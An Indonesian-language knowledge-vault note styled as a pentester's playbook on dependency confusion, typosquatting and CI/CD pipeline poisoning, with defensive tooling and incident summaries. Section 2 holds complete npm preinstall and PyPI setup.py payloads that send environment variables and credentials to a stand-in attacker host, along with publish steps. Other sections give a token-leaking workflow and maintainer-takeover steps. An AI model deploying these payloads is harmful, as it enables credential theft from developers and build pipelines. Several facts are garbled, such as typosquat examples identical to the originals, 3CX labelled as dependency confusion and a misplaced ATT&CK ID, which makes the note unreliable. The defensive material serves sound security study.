---
tags:
  - supply-chain-security
  - dependency-confusion
  - typosquatting
  - package-security
  - software-supply-chain
  - sca
  - slsa
  - npm-security
  - pip-security
  - cargo-security
aliases:
  - Dependency Confusion Attack
  - Typosquatting Package Attack
  - Supply Chain Attack Practical
  - Dependency Hijacking
status: seedling
created: 2026-07-23
updated: 2026-07-23
cssclasses:
  - wide-table
---

# Dependency Confusion & Supply Chain Attacks: Pentester's Playbook

> [!tip] **Supply chain attacks** menargetkan trust relationship antara developer dan dependency manager (npm, pip, cargo, gem, maven). Teknik seperti **dependency confusion** mengeksploitasi package manager yang memprioritaskan public registry di atas private registry. Catatan ini mencakup attack, detection, dan defense dari sudut pandang red team dan blue team — dengan command yang bisa diuji di lingkungan lab.

---

## Daftar Isi

1. [[#1. Mekanisme Dependency Confusion]]
2. [[#2. Practical Attack — Dependency Confusion]]
3. [[#3. Typosquatting — Teknik & Tools]]
4. [[#4. Package Substitution & Protestware]]
5. [[#5. Defense & Detection — SCA Tools]]
6. [[#6. CI/CD Pipeline Poisoning]]
7. [[#7. Enterprise Mitigation]]
8. [[#8. Real Incidents — TTP & Lessons]]
9. [[#9. MITRE ATT&CK Mapping]]
10. [[#10. Lab Setup]]
11. [[#Referensi]]
12. [[#Koneksi ke Vault]]

---

## 1. Mekanisme Dependency Confusion

### 1.1 Cara Kerja

Ketika project menggunakan dependency, package manager mencari package di **beberapa registry** dengan urutan prioritas:

| Package Manager | Default Priority             | Konfigurasi Registry              |
| --------------- | ---------------------------- | --------------------------------- |
| **npm**         | Public > Private (scoped)    | `.npmrc`, `package.json`          |
| **pip**         | PyPI > Private index         | `pip.conf`, `PIP_EXTRA_INDEX_URL` |
| **cargo**       | crates.io > Git > Path       | `config.toml`, `Cargo.toml` patch |
| **gem**         | rubygems.org > Private       | `Gemfile` source block            |
| **maven**       | Maven Central > Private repo | `settings.xml`, `pom.xml`         |

**Attack flow:**

1. Pentester/recon engineer menemukan internal package name (misal: `@internal/auth-lib`)
2. Attacker mendaftarkan nama yang **sama** di public registry (npm/PyPI/crates.io)
3. Jika konfigurasi salah — package manager pull dari public registry, bukan internal
4. Malicious code ter-install di pipeline/production

### 1.2 Kenapa Ini Terjadi

```bash
# NPM — scoped package @internal/* otomatis cari di npmjs.com jika tidak dikonfigurasi
# .npmrc (harus ada):
@internal:registry=https://npm.internal.company.com/

# Jika .npmrc tidak ada → npm install @internal/auth-lib → AMBIL DARI PUBLIC!

# PIP — EXTRA_INDEX_URL lebih rendah prioritas dari PyPI
# pip.conf:
[global]
extra-index-url = https://pypi.internal.company.com/simple/
# → PyPI tetap di-check FIRST → dependency confusion!
```

---

## 2. Practical Attack — Dependency Confusion

### 2.1 Setup Lab Environment

```bash
# Buat project target
mkdir dep-confusion-lab && cd dep-confusion-lab
npm init -y

# Buat package.json dengan internal-style package (scoped)
echo '{
  "name": "test-project",
  "version": "1.0.0",
  "dependencies": {
    "@internal/secret-sauce": "^1.0.0"
  }
}' > package.json
```

### 2.2 Attack Step-by-Step (NPM)

```bash
# Step 1: Register di npmjs.com
# Buat akun di https://www.npmjs.com/signup
npm login

# Step 2: Buat package dengan nama yang sama
mkdir @internal-secret-sauce && cd @internal-secret-sauce
npm init --scope=internal

# Step 3: Tambahkan malicious preinstall script
# package.json:
# "scripts": {
#   "preinstall": "node malicious.js",
#   "preuninstall": "node malicious.js"
# }

# Buat malicious.js — exfiltrate environment variables
cat > malicious.js << 'EOF'
const https = require('https');
const data = JSON.stringify({
  env: process.env,
  hostname: require('os').hostname(),
  cwd: process.cwd(),
  pwd: process.env.PWD || 'unknown',
  aws_creds: process.env.AWS_SECRET_ACCESS_KEY ? 'EXISTS' : 'NONE'
});
https.request(`https://attacker.example.com/exfil?data=${Buffer.from(data).toString('base64')}`)
  .on('error', () => {})  // silent fail
  .end();
// Proceed with normal install (mask malicious activity)
EOF

# Step 4: Publish
npm publish --access public

# Step 5: Test — victim menjalankan
cd victim-project
npm install
# ⟶ Malicious code ter-eksekusi via preinstall hook!
```

### 2.3 PyPI Variant

```bash
# Step 1: Recon — cari nama package internal
# Cek requirements.txt atau pip.conf untuk nama package aneh
grep -r "internal" requirements.txt
grep -r "extra-index-url" pip.conf

# Step 2: Buat package malicious
mkdir internal-auth-lib && cd internal-auth-lib
cat > setup.py << 'EOF'
import setuptools
import os
import urllib.request

# Malicious code — di-eksekusi saat pip install
try:
    hostname = os.uname().nodename
    env = dict(os.environ)
    urllib.request.urlopen(
        f"https://attacker.example.com/exfil?h={hostname}&env={str(env)[:500]}",
        timeout=2
    )
except:
    pass

setuptools.setup(
    name="internal-auth-lib",
    version="1.0.0",
    packages=setuptools.find_packages(),
)
EOF

# Step 3: Build dan publish ke PyPI
python setup.py sdist bdist_wheel
twine upload dist/*

# Step 4: Victim install
pip install internal-auth-lib
```

### 2.4 Detection — Cara Cek Apakah Kamu Vulnerable

```bash
# NPM — cek scoped package registry
cat .npmrc 2>/dev/null || echo "NO .npmrc — vulnerable!"
grep -r "@.*:registry" .npmrc

# PIP — cek index URL
pip config list | grep index-url
# Jika hanya ada extra-index-url → vulnerable!

# Cargo — cek registry config
cat .cargo/config.toml 2>/dev/null
# Cari replace-with untuk private registry

# Universal checker
npm install @internal/does-not-exist --dry-run 2>&1 | grep "404"
# Jika 404 → vulnerable (package bisa kita register)
```

---

## 3. Typosquatting — Teknik & Tools

### 3.1 Metode Typosquatting

| Teknik              | Contoh Original   | Typosquat                            |
| ------------------- | ----------------- | ------------------------------------ |
| Missing letter      | `lodash`          | `lodash` (lodah tanpa 's')           |
| Added letter        | `request`         | `requestt`                           |
| Swapped letters     | `moment`          | `momnet`                             |
| Homoglyph (Latin)   | `colors`          | `соlors` (Cyrillic 'о')              |
| Homoglyph (Unicode) | `node`            | `nоde` (Cyrillic 'о')                |
| Dash hypenation     | `python-dateutil` | `python-dateutil` (different hyphen) |
| Common misspelling  | `beautifulsoup`   | `beautifullsoup`                     |

### 3.2 Tools untuk Typosquatting Detection

```bash
# 1. typo-squatting-detector — analisis package name similarity
npm install -g typo-squatting-detector
typo-squatting-detector check lodash
# Output: similar names, similarity score

# 2. ConfusionMatrix — scan project untuk dependency confusion
pip install confusionmatrix
confusionmatrix --project /path/to/project
# Output: risk score per dependency

# 3. DNSGrep — cari leaked domain untuk typosquat detection
curl "https://dns.google/resolve?name=pypi.python.org&type=A"

# 4. Homoglyph attack detection
python3 -c "
import unicodedata
def has_homoglyph(s):
    for c in s:
        if ord(c) > 127 and unicodedata.category(c) != 'Mn':
            return True, c
    return False, None
print(has_homoglyph('соlors'))  # True
print(has_homoglyph('colors'))  # False
"

# 5. Cari typo-squat massal — analisis PyPI/npm metadata
# https://github.com/datadog/guarddog
guarddog verify requirements.txt
guarddog verify package-lock.json
```

---

## 4. Package Substitution & Protestware

### 4.1 Real Kasus

| Package                  | Year | Impact           | Detail                                     |
| ------------------------ | ---- | ---------------- | ------------------------------------------ |
| **colors.js** (faker.js) | 2022 | DoS global       | Maintainer corrupt library → infinite loop |
| **ua-parser-js**         | 2021 | Credential theft | Malicious code di postinstall              |
| **event-stream**         | 2018 | Bitcoin theft    | Copay wallet compromise via dependency     |
| **eslint-scope**         | 2018 | NPM token leak   | 3.7.0 release — stole CI credential        |
| **node-ipc**             | 2022 | Protestware      | Delete files in Russia/Belarus region      |
| **next.js** (GitHub)     | 2024 | Source leak      | Public repository exposure                 |

### 4.2 Package Substitution Attack

```bash
# Attack pattern: maintainer takeover
# 1. Cari abandoned package di npm/PyPI (>1 tahun no update)
# 2. Cek maintainer email — password reuse?
# 3. Request maintainer transfer
# 4. Release new version dengan backdoor

# Tools untuk cari abandoned package:
# npm-check — outdated packages
npm-check -g

# pip list — outdated packages
pip list --outdated

# GitHub — abandoned maintainer detection
# https://github.com/search?q=abandoned+package+transfer
```

---

## 5. Defense & Detection — SCA Tools

### 5.1 Command-Line SCA Tools

```bash
# NPM
npm audit                  # vulnerability scan
npm audit --json | jq '.vulnerabilities'  # detailed output
npm fund                   # check funding (protestware indicator)

# PIP
pip install pip-audit
pip-audit                  # scan installed packages
pip-audit -r requirements.txt  # scan requirements file

# Cargo
cargo install cargo-audit
cargo audit                # CVE scan via RustSec DB

# Universal
# OSSF Scorecard — GitHub repo security
go install github.com/ossf/scorecard/v4@latest
scorecard --repo=github.com/owner/repo

# Trivy — multi-language SCA
trivy fs . --scanners vuln   # filesystem scan
trivy sbom ./go.sum          # SBOM analysis

# Snyk CLI
npm install -g snyk
snyk test                    # full SCA scan
snyk monitor                 # continuous monitoring
```

### 5.2 SLSA Framework

SLSA (Supply-chain Levels for Software Artifacts) memberikan level keamanan:

| Level  | Build Integrity   | Provenance      | Requirement               |
| ------ | ----------------- | --------------- | ------------------------- |
| SLSA 1 | Documentation     | -               | Documented build process  |
| SLSA 2 | Tamper resistance | Hosted build    | Build service, provenance |
| SLSA 3 | Hardened          | Non-falsifiable | Hermetic builds           |
| SLSA 4 | Auditability      | Attestation     | Two-person review         |

```bash
# SLSA verifier
go install github.com/slsa-framework/slsa-verifier@latest
slsa-verifier verify-artifact \
  --artifact-path binary \
  --provenance-path build.slsa \
  --source-uri github.com/owner/repo
```

### 5.3 Sigstore & Cosign

```bash
# Install cosign
go install github.com/sigstore/cosign/v2/cmd/cosign@latest

# Sign container image
cosign sign --key cosign.key ghcr.io/owner/image:tag

# Verify signature
cosign verify --key cosign.pub ghcr.io/owner/image:tag

# Verify provenance tanpa kunci (keyless)
cosign verify ghcr.io/owner/image:tag

# Sign with GitHub OIDC
cosign sign --oidc-issuer https://token.actions.githubusercontent.com \
  ghcr.io/owner/image:tag
```

---

## 6. CI/CD Pipeline Poisoning

### 6.1 GITHUB_TOKEN Abuse

```bash
# GitHub Actions — attacker inject malicious workflow
# Jika attacker bisa PR → workflow auto-execute → token leak

# Step 1: Fork → buat PR dengan workflow change
# Step 2: Workflow mencuri GITHUB_TOKEN
# .github/workflows/leak.yml
# - name: Steal token
#   run: |
#     curl -X POST -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" \
#       https://api.github.com/repos/attacker/leak/issues \
#       -d '{"title":"leaked","body":"'${{ github.token }}'"}'

# Step 3: Use token untuk push malicious release
```

### 6.2 Self-Hosted Runner Compromise

```bash
# Self-hosted runner memiliki akses ke internal network
# Jika attacker bisa trigger workflow on self-hosted runner:

# Workflow yang mengeksekusi di self-hosted runner
# → access to:
# - Internal container registry
# - Cloud provider metadata
# - Private NPM/PyPI registry

# Defense:
# - Jangan pernah pakai self-hosted runner untuk PR dari fork
# - Gunakan ephemeral runner (scale set)
# - Network isolation via VPC
```

---

## 7. Enterprise Mitigation

| Layer        | Tool/Method                            | Implementation                      |
| ------------ | -------------------------------------- | ----------------------------------- |
| **Code**     | `.npmrc`, `pip.conf`, private registry | Force registry resolution           |
| **Build**    | `npm audit`, `pip-audit`, `cargo deny` | Block in CI pipeline                |
| **Registry** | Verdaccio, JFrog, GitHub Packages      | Mirror + cache public packages      |
| **Signing**  | Sigstore/cosign, PGP                   | Verify package integrity            |
| **Policy**   | SLSA 3+, OSSF Scorecard 6+             | Enforce at organization level       |
| **Runtime**  | Falco, Tracee                          | Monitor suspicious process behavior |

```bash
# Private registry — Verdaccio (NPM)
docker run -d --name verdaccio -p 4873:4873 verdaccio/verdaccio
npm set registry http://localhost:4873/

# Publish internal package ke private registry
npm publish --registry http://localhost:4873/

# Block public registry access di CI — firewall
# iptables:
iptables -A OUTPUT -d registry.npmjs.org -j DROP
# Atau via proxy:
HTTP_PROXY=http://inspect-proxy:3128 npm install
```

---

## 8. Real Incidents — TTP & Lessons

### SolarWinds (2020)

| Item          | Detail                                                           |
| ------------- | ---------------------------------------------------------------- |
| **Vector**    | Build server compromise → inject SUNBURST malware ke Orion build |
| **Scope**     | 18,000 customers affected, termasuk US govt                      |
| **Technique** | Supply chain poisoning di CI/CD pipeline                         |
| **Lesson**    | Build integrity + SLSA 4 would have prevented this               |

### Codecov (2021)

| Item          | Detail                                                       |
| ------------- | ------------------------------------------------------------ |
| **Vector**    | Docker image credential leak → attacker modify bash uploader |
| **Scope**     | All customers who ran CI with Codecov uploader (29,000+)     |
| **Technique** | Credential exposure → malicious release                      |
| **Lesson**    | Credential rotation + attestation                            |

### 3CX (2023)

| Item          | Detail                                             |
| ------------- | -------------------------------------------------- |
| **Vector**    | Dependency confusion via Electron update mechanism |
| **Scope**     | 600,000+ businesses compromised                    |
| **Technique** | Silent malicious update via signed binary          |
| **Lesson**    | Binary transparency + signing verification         |

---

## 9. MITRE ATT&CK Mapping

| Tactic          | Technique ID | Nama                    | Sub-technique                                |
| --------------- | ------------ | ----------------------- | -------------------------------------------- |
| Initial Access  | T1195        | Supply Chain Compromise | T1195.001 (Compromise Software Dependencies) |
| Initial Access  | T1195        | Supply Chain Compromise | T1195.002 (Compromise Software Supply Chain) |
| Execution       | T1204        | User Execution          | T1204.002 (Malicious File)                   |
| Persistence     | T1502        | Parent PID Spoofing     | Dependency confusion as service              |
| Defense Evasion | T1574        | Hijack Execution Flow   | T1574.006 (Dynamic Linker Hijacking)         |
| Collection      | T1005        | Data from Local System  | via preinstall/postinstall scripts           |

---

## 10. Lab Setup

```bash
# Docker-based lab untuk testing
cat > docker-compose.yml << 'EOF'
version: '3'
services:
  internal-npm:
    image: verdaccio/verdaccio
    ports:
      - "4873:4873"
  victim-app:
    build:
      context: .
      dockerfile: Dockerfile
    environment:
      - NPM_CONFIG_REGISTRY=http://internal-npm:4873/
    depends_on:
      - internal-npm
EOF

# Test dependency confusion:
# 1. Publish package ke internal-npm
# 2. Hapus atau salah konfigurasi registry
# 3. Coba install — apakah package dari npmjs.com?

# Check your project:
git clone https://github.com/koenrouwhof/dependency-confusion-demo
cd dependency-confusion-demo
make test
```

---

## Referensi

1. Alex Birsan. _"Dependency Confusion: How I Hacked Into Apple, Microsoft, and Dozens of Other Companies."_ (2021).
2. OWASP. _"Software Supply Chain Security."_ (2024). https://owasp.org/www-project-software-supply-chain-security/
3. Google. _"SLSA Framework — Supply Chain Levels for Software Artifacts."_ (2024). https://slsa.dev/
4. Sigstore. _"Cosign: Container Signing, Verification, and Storage."_ (2024).
5. OpenSSF. _"Scorecard — Security Health Metrics for Open Source."_ (2024).
6. Datadog. _"GuardDog — Detect Malicious PyPI Packages."_ (2024).
7. ReversingLabs. _"3CX Supply Chain Attack Analysis."_ (2023).
8. CrowdStrike. _"SolarWinds SUNBURST Technical Analysis."_ (2021).
9. MITRE. _"ATT&CK T1195 — Supply Chain Compromise."_ (2024).
10. Snyk. _"State of Open Source Security 2024."_ (2024).

---

## Koneksi ke Vault

| Catatan                                         | Koneksi                                                        |
| ----------------------------------------------- | -------------------------------------------------------------- |
| [[software-supply-chain-security-deepdive]]     | Deep-dive supply chain — extension dengan practical attack     |
| [[software-supply-chain-security]]              | Overview supply chain — catatan ini implementasi konkret       |
| [[cicd-shiftleft-shiftright]]                   | CI/CD security — pipeline hardening untuk prevent supply chain |
| [[devsecops-pipeline-sast-dast-sbom]]           | SBOM — Software Bill of Materials untuk dependency inventory   |
| [[rust-unsafe-code-auditing-security-deepdive]] | Rust supply chain — cargo-audit, crate compromise              |
| [[claude-code-plugin-marketplace-deepdive]]     | Plugin marketplace — polar opposite dari open ecosystem        |
